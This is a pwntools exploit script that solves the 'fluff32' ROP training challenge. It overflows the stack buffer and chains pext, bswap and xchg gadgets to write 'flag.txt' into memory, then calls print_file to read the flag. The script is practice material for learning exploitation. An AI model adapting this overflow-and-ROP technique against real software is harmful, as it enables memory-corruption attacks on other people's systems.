from pwn import *
import binascii
import warnings
warnings.filterwarnings("ignore")

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-gef
break print_file
'''.format(**locals())

exe = './fluff32'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'
context.delete_corefiles = True

def find_eip(payload):
    p = process(exe)
    p.sendlineafter('>', payload)
    p.wait()
    eip_offset = cyclic_find(p.corefile.eip)
    info('located EIP offset at {a}'.format(a=eip_offset))
    return eip_offset

eip_offset = find_eip(cyclic(100))
io = start()

def generate_mask(string):
    mask_arr = []
    source_pext_string = str(bin(int("b0bababa", 16))[2:])
    for c in string:
        mask = ""
        destination = str(bin(int(str(hex(ord(c)))[2:] ,16))[2:].zfill(8))
        destination_index = 0
        for i, s in enumerate(source_pext_string):
            if destination_index < 8:
                if s == destination[destination_index]:
                    mask += "1"
                    destination_index += 1
                else:
                    mask += "0"
            else:
                mask += "0"
        mask_arr.append(int(hex(int(mask, 2)),16))
    return mask_arr

rop = ROP(elf)

mask_arr = generate_mask("flag.txt")

print_file = 0x80483d0
exit = 0xf7ded680
data = 0x0804a018
questionable_gadget = 0x08048543
xchg = 0x08048555
pop_ebp = 0x080485bb
full_mask = generate_mask("flag.txt")
pop_ecx_bswap_ecx = 0x08048558
bswap_ecx = 0x08048559

final_exploit = b""
data_offset = 0

for i, c in enumerate(full_mask):
    rop.raw([pop_ebp, c, questionable_gadget, pop_ecx_bswap_ecx, data + data_offset, bswap_ecx, xchg])
    data_offset += 1

for i, c in enumerate(full_mask):
    rop.raw([pop_ebp, c, questionable_gadget, pop_ecx_bswap_ecx, pack(data + i, endian='big'), xchg])

rop.print_file(data)
rop.chain()

payload = flat(
    asm('nop') * eip_offset,  
    rop
)

io.sendlineafter('>', payload)
#io.interactive()

io.recvuntil('Thank you!\n')
flag = io.recv()
success(flag)
	
